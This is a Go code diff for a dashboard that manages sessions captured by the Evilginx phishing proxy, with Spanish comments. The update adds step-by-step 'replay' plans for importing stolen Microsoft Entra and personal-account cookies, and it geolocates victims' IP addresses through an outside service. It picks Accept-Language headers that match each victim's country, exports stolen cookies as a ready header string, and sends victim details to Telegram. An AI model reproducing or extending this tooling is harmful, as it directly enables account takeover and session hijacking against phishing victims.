@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -25,7 +26,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.3.1"
+const version = "1.4.0"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -276,6 +277,253 @@ func (s Session) inspectLoot() lootInfo {
 
 func (s Session) hasValidSession() bool { return s.inspectLoot().Valid }
 
+func (s Session) replayPlan() replayPlan {
+	loot := s.inspectLoot()
+	p := replayPlan{UASummary: uaSummary(s.UserAgent)}
+	switch loot.Kind {
+	case "entra":
+		p.Label = "Microsoft Entra"
+		p.ImportOn = "https://login.microsoftonline.com"
+		p.ThenOpen = "https://www.office.com"
+	case "msa":
+		p.Label = "Microsoft MSA"
+		p.ImportOn = "https://login.live.com"
+		p.ThenOpen = "https://account.microsoft.com"
+		p.Avoid = "https://outlook.live.com (no SSO from MSAUTHP)"
+	default:
+		p.Label = s.Phishlet
+	}
+	return p
+}
+
+func uaSummary(ua string) string {
+	if ua == "" {
+		return ""
+	}
+	osName := "unknown OS"
+	switch {
+	case strings.Contains(ua, "Windows NT 10"):
+		osName = "Windows 10/11"
+	case strings.Contains(ua, "Windows NT"):
+		osName = "Windows"
+	case strings.Contains(ua, "Mac OS X") || strings.Contains(ua, "Macintosh"):
+		osName = "macOS"
+	case strings.Contains(ua, "Android"):
+		osName = "Android"
+	case strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad"):
+		osName = "iOS"
+	case strings.Contains(ua, "CrOS"):
+		osName = "ChromeOS"
+	case strings.Contains(ua, "Linux"):
+		osName = "Linux"
+	}
+	browser := "unknown browser"
+	pick := func(prefix string) string {
+		i := strings.Index(ua, prefix)
+		if i < 0 {
+			return ""
+		}
+		rest := ua[i+len(prefix):]
+		n := 0
+		for n < len(rest) && ((rest[n] >= '0' && rest[n] <= '9') || rest[n] == '.') {
+			n++
+		}
+		ver := rest[:n]
+		if dot := strings.Index(ver, "."); dot > 0 {
+			ver = ver[:dot]
+		}
+		return ver
+	}
+	switch {
+	case strings.Contains(ua, "Edg/"):
+		browser = "Edge " + pick("Edg/")
+	case strings.Contains(ua, "OPR/"):
+		browser = "Opera " + pick("OPR/")
+	case strings.Contains(ua, "Chrome/") && !strings.Contains(ua, "Chromium"):
+		browser = "Chrome " + pick("Chrome/")
+	case strings.Contains(ua, "Firefox/"):
+		browser = "Firefox " + pick("Firefox/")
+	case strings.Contains(ua, "Safari/") && strings.Contains(ua, "Version/"):
+		browser = "Safari " + pick("Version/")
+	}
+	return strings.TrimSpace(browser + " · " + osName)
+}
+
+func suggestAcceptLang(cc string) string {
+	cc = strings.ToUpper(strings.TrimSpace(cc))
+	m := map[string]string{
+		"ES": "es-ES,es;q=0.9,en;q=0.8", "MX": "es-MX,es;q=0.9,en;q=0.8",
+		"AR": "es-AR,es;q=0.9,en;q=0.8", "CO": "es-CO,es;q=0.9,en;q=0.8",
+		"CL": "es-CL,es;q=0.9,en;q=0.8", "PE": "es-PE,es;q=0.9,en;q=0.8",
+		"US": "en-US,en;q=0.9", "GB": "en-GB,en;q=0.9", "AU": "en-AU,en;q=0.9",
+		"CA": "en-CA,en;q=0.9,fr-CA;q=0.8", "IE": "en-IE,en;q=0.9",
+		"FR": "fr-FR,fr;q=0.9,en;q=0.8", "DE": "de-DE,de;q=0.9,en;q=0.8",
+		"IT": "it-IT,it;q=0.9,en;q=0.8", "PT": "pt-PT,pt;q=0.9,en;q=0.8",
+		"BR": "pt-BR,pt;q=0.9,en;q=0.8", "NL": "nl-NL,nl;q=0.9,en;q=0.8",
+		"BE": "fr-BE,fr;q=0.9,nl;q=0.8,en;q=0.7", "CH": "de-CH,de;q=0.9,fr;q=0.8,en;q=0.7",
+		"AT": "de-AT,de;q=0.9,en;q=0.8", "PL": "pl-PL,pl;q=0.9,en;q=0.8",
+		"TR": "tr-TR,tr;q=0.9,en;q=0.8", "RU": "ru-RU,ru;q=0.9,en;q=0.8",
+		"JP": "ja-JP,ja;q=0.9,en;q=0.8", "CN": "zh-CN,zh;q=0.9,en;q=0.8",
+		"KR": "ko-KR,ko;q=0.9,en;q=0.8", "IN": "en-IN,en;q=0.9,hi;q=0.8",
+		"AE": "ar-AE,ar;q=0.9,en;q=0.8", "SA": "ar-SA,ar;q=0.9,en;q=0.8",
+	}
+	if s, ok := m[cc]; ok {
+		return s
+	}
+	if len(cc) != 2 {
+		return ""
+	}
+	lo := strings.ToLower(cc)
+	return lo + "-" + cc + "," + lo + ";q=0.9,en;q=0.8"
+}
+
+func cleanIP(s string) string {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return ""
+	}
+	if host, _, err := net.SplitHostPort(s); err == nil {
+		s = host
+	}
+	s = strings.Trim(s, "[]")
+	ip := net.ParseIP(s)
+	if ip == nil {
+		return ""
+	}
+	return ip.String()
+}
+
+func isPrivateIP(s string) bool {
+	ip := net.ParseIP(s)
+	if ip == nil {
+		return true
+	}
+	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified()
+}
+
+type geoStore struct {
+	mu    sync.Mutex
+	m     map[string]geoInfo
+	file  string
+	on    bool
+	infl  map[string]bool
+}
+
+var geo = &geoStore{m: map[string]geoInfo{}, infl: map[string]bool{}}
+
+var geoClient = &http.Client{Timeout: 4 * time.Second}
+
+func (g *geoStore) load() {
+	if g.file == "" {
+		return
+	}
+	b, err := os.ReadFile(g.file)
+	if err != nil {
+		return
+	}
+	g.mu.Lock()
+	json.Unmarshal(b, &g.m)
+	if g.m == nil {
+		g.m = map[string]geoInfo{}
+	}
+	g.mu.Unlock()
+}
+
+func (g *geoStore) saveLocked() {
+	if g.file == "" {
+		return
+	}
+	b, _ := json.MarshalIndent(g.m, "", "  ")
+	os.WriteFile(g.file, b, 0600)
+}
+
+func (g *geoStore) get(ip string) (geoInfo, bool) {
+	g.mu.Lock()
+	defer g.mu.Unlock()
+	v, ok := g.m[ip]
+	return v, ok && v.CountryCode != ""
+}
+
+func (g *geoStore) lookup(ip string, block bool) geoInfo {
+	ip = cleanIP(ip)
+	if !g.on || ip == "" || isPrivateIP(ip) {
+		return geoInfo{}
+	}
+	if v, ok := g.get(ip); ok {
+		return v
+	}
+	g.mu.Lock()
+	if g.infl[ip] {
+		g.mu.Unlock()
+		if !block {
+			return geoInfo{}
+		}
+	} else {
+		g.infl[ip] = true
+		g.mu.Unlock()
+		info := fetchGeo(ip)
+		g.mu.Lock()
+		delete(g.infl, ip)
+		if info.CountryCode != "" {
+			g.m[ip] = info
+			g.saveLocked()
+		}
+		g.mu.Unlock()
+		return info
+	}
+	// waiter: poll cache briefly
+	deadline := time.Now().Add(3 * time.Second)
+	for time.Now().Before(deadline) {
+		if v, ok := g.get(ip); ok {
+			return v
+		}
+		time.Sleep(150 * time.Millisecond)
+	}
+	return geoInfo{}
+}
+
+func fetchGeo(ip string) geoInfo {
+	u := "http://ip-api.com/json/" + ip + "?fields=status,country,countryCode,regionName,city,isp,as,timezone,query"
+	resp, err := geoClient.Get(u)
+	if err != nil {
+		return geoInfo{}
+	}
+	defer resp.Body.Close()
+	var raw struct {
+		Status      string `json:"status"`
+		Country     string `json:"country"`
+		CountryCode string `json:"countryCode"`
+		RegionName  string `json:"regionName"`
+		City        string `json:"city"`
+		ISP         string `json:"isp"`
+		AS          string `json:"as"`
+		Timezone    string `json:"timezone"`
+	}
+	if json.NewDecoder(resp.Body).Decode(&raw) != nil || raw.Status != "success" {
+		return geoInfo{}
+	}
+	return geoInfo{
+		Country: raw.Country, CountryCode: raw.CountryCode, Region: raw.RegionName,
+		City: raw.City, ISP: raw.ISP, ASN: raw.AS, Timezone: raw.Timezone,
+	}
+}
+
+func warmGeo(sessions []Session) {
+	seen := map[string]bool{}
+	for _, s := range sessions {
+		ip := cleanIP(s.RemoteAddr)
+		if ip == "" || seen[ip] || isPrivateIP(ip) {
+			continue
+		}
+		seen[ip] = true
+		if _, ok := geo.get(ip); ok {
+			continue
+		}
+		geo.lookup(ip, true)
+		time.Sleep(300 * time.Millisecond)
+	}
+}
+
 // ---- API shapes ----
 
 type apiSession struct {
@@ -295,20 +543,43 @@ type apiSession struct {
 	Create     int64    `json:"create"`
 	Update     int64    `json:"update"`
 	UserAgent  string   `json:"useragent"`
-	Landing    string   `json:"landing"`
-	SessionId  string   `json:"session_id"`
+	Landing    string      `json:"landing"`
+	SessionId  string      `json:"session_id"`
+	Geo        *geoInfo    `json:"geo,omitempty"`
+	Replay     *replayPlan `json:"replay,omitempty"`
+}
+
+type geoInfo struct {
+	Country     string `json:"country"`
+	CountryCode string `json:"country_code"`
+	Region      string `json:"region"`
+	City        string `json:"city"`
+	ISP         string `json:"isp"`
+	ASN         string `json:"asn"`
+	Timezone    string `json:"timezone"`
+}
+
+type replayPlan struct {
+	ImportOn   string `json:"import_on"`
+	ThenOpen   string `json:"then_open"`
+	Avoid      string `json:"avoid"`
+	Label      string `json:"label"`
+	UASummary  string `json:"ua_summary"`
+	AcceptLang string `json:"accept_lang"`
 }
 
 type apiData struct {
-	Now       string       `json:"now"`
-	DB        string       `json:"db"`
-	SBEnabled bool         `json:"sb_enabled"`
-	Sessions  []apiSession `json:"sessions"`
+	Now        string       `json:"now"`
+	DB         string       `json:"db"`
+	SBEnabled  bool         `json:"sb_enabled"`
+	GeoEnabled bool         `json:"geo_enabled"`
+	Sessions   []apiSession `json:"sessions"`
 }
 
 // sbEnabled reflects whether Google Safe Browsing lookups are active (OFF unless
 // an API key is supplied). Surfaced to the UI so the state is always visible.
 var sbEnabled bool
+var geoEnabled bool
 
 // ---- Data loading with mtime cache ----
 // The full snapshot+parse only runs when data.db actually changed (a new
@@ -679,24 +950,61 @@ func startWatcher(dbPath string, interval time.Duration) {
 					continue
 				}
 				var msg string
+				loot := x.inspectLoot()
+				plan := x.replayPlan()
+				ginfo := geo.lookup(x.RemoteAddr, true)
+				plan.AcceptLang = suggestAcceptLang(ginfo.CountryCode)
 				if cfg.MinimalAlerts {
-					msg = fmt.Sprintf("🎣 Nueva sesión válida capturada (phishlet %s). Revísalo en el panel.", x.Phishlet)
+					where := ginfo.CountryCode
+					if where == "" {
+						where = "?"
+					}
+					msg = fmt.Sprintf("Sesión %s · %s · %s · panel Replay", plan.Label, where, plan.UASummary)
 				} else {
 					user := x.Username
 					if user == "" {
 						user = "(sin usuario)"
 					}
-					loot := x.inspectLoot()
-					persist := ""
+					persist := "sesión"
 					if loot.Persistent {
-						persist = " · persistente"
+						persist = "persistente"
 					}
-					kind := loot.Kind
-					if kind == "" {
-						kind = "token"
+					loc := x.RemoteAddr
+					if ginfo.Country != "" {
+						loc = ginfo.Country
+						if ginfo.CountryCode != "" {
+							loc += " (" + ginfo.CountryCode + ")"
+						}
+						if ginfo.City != "" {
+							loc += " · " + ginfo.City
+						}
 					}
-					msg = fmt.Sprintf("Nueva sesión %s%s\n\n`%s`\n%s · %s\n%s · %d cookies\n#%d · %s",
-						kind, persist, user, x.Phishlet, loot.Token, x.RemoteAddr, x.cookieCount(), x.Id, time.Unix(x.UpdateTime, 0).Format("2006-01-02 15:04:05"))
+					netw := ginfo.ASN
+					if ginfo.ISP != "" && !strings.Contains(netw, ginfo.ISP) {
+						if netw != "" {
+							netw += " · " + ginfo.ISP
+						} else {
+							netw = ginfo.ISP
+						}
+					}
+					var b strings.Builder
+					fmt.Fprintf(&b, "%s · %s\n\n", plan.Label, persist)
+					fmt.Fprintf(&b, "`%s`\n", user)
+					fmt.Fprintf(&b, "%s\n", loc)
+					if netw != "" {
+						fmt.Fprintf(&b, "%s\n", netw)
+					}
+					if plan.UASummary != "" {
+						fmt.Fprintf(&b, "%s\n", plan.UASummary)
+					}
+					if plan.ImportOn != "" {
+						fmt.Fprintf(&b, "\nImportar en:\n%s\nLuego:\n%s\n", plan.ImportOn, plan.ThenOpen)
+					}
+					if plan.Avoid != "" {
+						fmt.Fprintf(&b, "Evitar: %s\n", plan.Avoid)
+					}
+					fmt.Fprintf(&b, "\nPanel → Replay · #%d", x.Id)
+					msg = b.String()
 				}
 				if err := sendTelegram(cfg.TGToken, cfg.TGChat, msg); err != nil {
 					log.Println("telegram:", err)
@@ -1027,17 +1335,30 @@ func dataHandler(dbPath string) http.HandlerFunc {
 			http.Error(w, err.Error(), 500)
 			return
 		}
-		d := apiData{Now: time.Now().Format("2006-01-02 15:04:05"), DB: dbPath, SBEnabled: sbEnabled}
+		d := apiData{Now: time.Now().Format("2006-01-02 15:04:05"), DB: dbPath, SBEnabled: sbEnabled, GeoEnabled: geoEnabled}
 		for _, s := range sessions {
 			loot := s.inspectLoot()
-			d.Sessions = append(d.Sessions, apiSession{
+			plan := s.replayPlan()
+			ginfo := geo.lookup(s.RemoteAddr, false)
+			if ginfo.CountryCode != "" {
+				plan.AcceptLang = suggestAcceptLang(ginfo.CountryCode)
+			} else if geoEnabled {
+				go geo.lookup(s.RemoteAddr, true)
+			}
+			row := apiSession{
 				Id: s.Id, Phishlet: s.Phishlet, Username: s.Username, Password: s.Password,
 				Valid: loot.Valid, Kind: loot.Kind, Token: loot.Token, Persistent: loot.Persistent, Tokens: loot.Tokens,
 				Expires: loot.Expires, TTLKind: loot.TTLKind,
 				Cookies: s.cookieCount(), RemoteAddr: s.RemoteAddr,
 				Create: s.CreateTime, Update: s.UpdateTime, UserAgent: s.UserAgent,
 				Landing: s.LandingURL, SessionId: s.SessionId,
-			})
+				Replay: &plan,
+			}
+			if ginfo.CountryCode != "" {
+				gi := ginfo
+				row.Geo = &gi
+			}
+			d.Sessions = append(d.Sessions, row)
 		}
 		w.Header().Set("Content-Type", "application/json; charset=utf-8")
 		json.NewEncoder(w).Encode(d)
@@ -1054,8 +1375,18 @@ func cookiesHandler(dbPath string) http.HandlerFunc {
 		}
 		for _, s := range sessions {
 			if fmt.Sprintf("%d", s.Id) == id {
+				cks := s.exportCookies()
+				if r.URL.Query().Get("format") == "header" {
+					parts := make([]string, 0, len(cks))
+					for _, c := range cks {
+						parts = append(parts, c.Name+"="+c.Value)
+					}
+					w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+					w.Write([]byte(strings.Join(parts, "; ")))
+					return
+				}
 				w.Header().Set("Content-Type", "application/json; charset=utf-8")
-				json.NewEncoder(w).Encode(s.exportCookies())
+				json.NewEncoder(w).Encode(cks)
 				return
 			}
 		}
@@ -1116,6 +1447,7 @@ func healthHandler(dbPath string) http.HandlerFunc {
 			"sessions":      total,
 			"valid_victims": validV,
 			"tg_enabled":    getSettings().TGEnabled,
+			"geo_enabled":   geoEnabled,
 		})
 	}
 }
@@ -1180,6 +1512,8 @@ func main() {
 	urlsFile := flag.String("urls-file", "/root/.evilginx-dashboard-urls.json", "fichero donde persistir las URLs guardadas a mano")
 	settingsFile := flag.String("settings-file", "/root/.evilginx-dashboard-settings.json", "fichero donde persistir los ajustes (Telegram, etc.)")
 	vstateFile := flag.String("vstate-file", "/root/.evilginx-dashboard-vstate.json", "fichero donde persistir el estado por víctima (usada/notas)")
+	geoFile := flag.String("geo-file", "/root/.evilginx-dashboard-geo.json", "cache de GeoIP (país/ASN de las IPs de las víctimas)")
+	nogeo := flag.Bool("nogeo", false, "no resolver país/ASN (no se envían IPs de víctimas a ip-api.com)")
 	insecure := flag.Bool("insecure", false, "permitir escuchar fuera de localhost sin auth (NO recomendado)")
 	flag.Parse()
 
@@ -1210,6 +1544,19 @@ func main() {
 	}
 	if nonLocal {
 		log.Println("AVISO: escuchando fuera de localhost. Asegúrate de tener firewall/VPN delante; lo recomendado es 127.0.0.1 + túnel SSH.")
+	}
+
+	geoEnabled = !*nogeo
+	geo.on = geoEnabled
+	geo.file = *geoFile
+	geo.load()
+	if geoEnabled {
+		log.Println("GeoIP: ip-api.com (IPs de víctimas, cache local). -nogeo para desactivar.")
+		if s, err := loadSessionsCached(*dbPath); err == nil {
+			go warmGeo(s)
+		}
+	} else {
+		log.Println("GeoIP: desactivado")
 	}
 
 	http.HandleFunc("/", basicAuth(func(w http.ResponseWriter, r *http.Request) {
